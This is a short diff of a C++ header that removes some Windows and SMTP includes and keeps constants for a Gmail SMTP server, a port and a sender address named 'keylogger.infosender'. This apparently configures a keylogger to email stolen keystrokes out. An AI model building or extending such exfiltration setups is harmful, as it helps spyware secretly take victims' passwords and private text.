@@ -1,21 +1,5 @@
 #pragma once
 
-#include "CSmtp.h"
-
-#ifndef _WINSOCKAPI_
-#define _WINSOCKAPI_
-#endif // !_WINSOCKAPI_
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
-#endif // !WIN32_LEAN_AND_MEAN
-
-#include <stdio.h>
-#include <winuser.h>
-#include <windows.h>
-#include <windowsx.h>
-#include <string>
-#include "StringHelper.h"
-
 #define GMAIL_SERVER "smtp.gmail.com"
 #define GMAIL_PORT 465
 #define EMAIL_LOGIN "keylogger.infosender@gmail.com"
